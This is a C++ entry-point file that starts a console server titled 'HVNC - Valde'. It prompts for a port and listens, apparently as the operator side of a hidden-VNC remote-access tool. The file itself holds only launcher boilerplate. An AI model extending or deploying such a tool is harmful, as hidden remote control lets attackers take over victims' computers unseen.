#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#include "_version.h"

#include <iostream>

int port;

int CALLBACK WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    AllocConsole();
    FILE* stream = nullptr;
    freopen_s(&stream, "CONIN$",  "r", stdin);
    freopen_s(&stream, "CONOUT$", "w", stdout);
    freopen_s(&stream, "CONOUT$", "w", stderr);

    SetConsoleTitle(TEXT("HVNC - Valde"));

    std::cout << "[!] Server Port: ";
    std::cin >> port;

    std::system("CLS");
    printf("[-] Starting HVNC Server...\n");

    if(!StartServer(port))
    {
        wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError());
        getchar();
        return 0;
    }

    printf("[+] Server Started!\n");
    printf("[+] Listening on Port: %d\n", port);

    while(true)
    {
        Sleep(1000);
    }

    return 0;
}
